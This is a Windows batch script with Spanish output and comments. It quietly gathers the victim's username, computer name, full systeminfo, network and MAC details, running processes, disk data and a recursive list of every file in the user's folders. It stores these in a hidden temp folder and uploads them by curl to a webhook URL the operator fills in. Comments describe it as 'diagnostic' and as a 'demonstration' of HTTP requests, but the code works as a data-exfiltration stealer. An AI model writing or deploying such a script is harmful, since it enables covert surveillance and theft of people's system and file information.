:: READ THE README.txt FILE BEFORE USING THIS SCRIPT. IT CONTAINS IMPORTANT INFORMATION ABOUT THE SCRIPT'S FUNCTIONALITY AND POTENTIAL RISKS.
@echo off
:: Reeplace the variable "PUT_THE_WINDOW_TITLE_THAT_YOU_WANT" with the title you want that appears in the cmd window.
title "PUT_THE_WINDOW_TITLE_THAT_YOU_WANT"

:: Defines the webhook endpoint used for HTTP communication.
:: Reemplace the variable "YOUR_WEBHOOK_URL_GOES_HERE" with the actual webhook URL you want to use for sending the data.
set "WEBHOOK=YOUR_WEBHOOK_URL_GOES_HERE"

set "LOGDIR=%TEMP%\SystemLogs"
:: Creates the directory used to store diagnostic reports.
mkdir "%LOGDIR%" >nul 2>&1

if exist "%LOGDIR%" (
    :: Marks the report directory as hidden.
    attrib +h "%LOGDIR%" >nul 2>&1
    echo Carpeta creada en %LOGDIR%
) else (
    set "LOGDIR=%USERPROFILE%\Documents\SystemLogs"
    mkdir "%LOGDIR%" >nul 2>&1
    echo Se ha usado la carpeta alternativa en Documentos.
)

set "DATA=%LOGDIR%\data-not.txt"

:: Records basic information about the current user and computer.
echo Usuario: %USERNAME% >> "%DATA%"
echo Ordenador: %COMPUTERNAME% >> "%DATA%"
echo Fecha: %date% >> "%DATA%"
echo Hora: %time% >> "%DATA%"
echo. >> "%DATA%"
echo Información del sistema >> "%DATA%"
:: Collects Windows operating system and system configuration details.
systeminfo >> "%DATA%"
echo. >> "%DATA%"
echo Red y dirección MAC >> "%DATA%"
:: Displays network adapter configuration and IP information.
ipconfig /all >> "%DATA%"
echo. >> "%DATA%"
echo. >> "%DATA%"
echo Conectividad >> "%DATA%"
:: Tests connectivity to an external network destination.
ping -n 4 1.1.1.1 >> "%DATA%"
echo Almacenamiento >> "%DATA%"
:: Retrieves local disk capacity and available storage.
powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID,Size,FreeSpace | Format-Table -AutoSize" >> "%DATA%"

set "USUARIO=%USERNAME%"
set "CARPETA=C:\Users\%USUARIO%"
set "LOG=%USERPROFILE%\Documents\files_list.txt"

:: Begins generating a file inventory for selected user folders.
echo Carpeta de Descargas > "%LOG%"
dir "%USERPROFILE%\Downloads" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Imágenes >> "%LOG%"
dir "%USERPROFILE%\Pictures" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Videos >> "%LOG%"
dir "%USERPROFILE%\Videos" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Documentos >> "%LOG%"
dir "%USERPROFILE%\Documents" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta de Escritorio >> "%LOG%"
dir "%USERPROFILE%\Desktop" /a-d /b /s >> "%LOG%" 2>nul
echo Carpeta completa del usuario >> "%LOG%"
dir "%CARPETA%" /a-d /b /s >> "%LOG%" 2>nul

:: Lists processes currently running on the computer.
tasklist >> "%DATA%"

:: Demonstrates HTTP multipart requests to an external endpoint.
curl -s -F "content=Equipo: %COMPUTERNAME% | Usuario: %USERNAME% | %date% %time%" -F "file=@\"%DATA%\"" "%WEBHOOK%"
:: Attempts to submit the generated file inventory as an attachment.
curl -s -F "file=@\"%LOG%\"" "%WEBHOOK%"

:: Terminates the script.
exit
